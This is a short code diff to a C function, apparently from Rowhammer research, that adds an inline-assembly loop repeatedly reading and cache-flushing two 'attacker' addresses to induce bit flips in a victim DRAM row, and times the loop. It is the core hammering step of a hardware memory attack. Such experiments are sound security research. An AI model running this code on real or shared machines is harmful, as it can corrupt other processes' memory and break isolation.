@@ -52,6 +52,22 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
         clflush(attacker_virt_addr_2);
     }
 
+    num_reads = HAMMERS_PER_ITER;
+    uint64_t total_time = rdtscp();
+    while (num_reads-- > 0 ) {
+       asm volatile(
+            "mov (%0), %%rax\n\t"
+            "mov (%1), %%rax\n\t"
+            "clflush (%0)\n\t"
+            "clflush (%1)\n\t"
+            "mfence\n\t"
+            :
+            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
+            : "rax"
+        );
+    }
+    total_time = rdtscp() - total_time;
+
     uint32_t number_of_bitflips_in_target = 0;
     for (uint32_t index = 0; index < ROW_SIZE; index++) {
         // flush 64 byte cacheline
@@ -61,6 +77,7 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
         }
     }
     printf("time to perform 2 ACTS: %ld\n", (measures_2 - measures_1) / HAMMERS_PER_ITER);
+    printf("total time to perform %d ACTS: %ld\n", HAMMERS_PER_ITER, total_time);
     return number_of_bitflips_in_target; 
 }
 
